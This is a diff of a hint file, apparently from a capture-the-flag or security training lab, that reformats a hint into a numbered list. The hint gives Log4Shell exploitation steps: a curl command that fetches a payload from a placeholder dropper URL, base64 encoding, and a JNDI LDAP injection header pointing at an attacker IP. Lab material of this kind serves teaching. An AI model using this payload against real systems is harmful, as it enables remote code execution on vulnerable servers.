@@ -50,10 +50,7 @@ You need to encode the malicious command as base64, and add it to the ldap url. 
 
 ### HINT 3
 
-    Craft the malicious command: curl PAYLOADDROPPERURL --output /srv/connectioncheck
-
-    Encode it as base64 using any tool. Base64encode.org is a great option.
-
-    Replace it in the command: curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/Command/Base64/PAYLOAD}'
-
-    Execute
+1. Craft the malicious command: curl PAYLOADDROPPERURL --output /srv/connectioncheck
+2. Encode it as base64 using any tool. Base64encode.org is a great option.
+3. Replace it in the command: curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/Command/Base64/PAYLOAD}'
+4. Execute
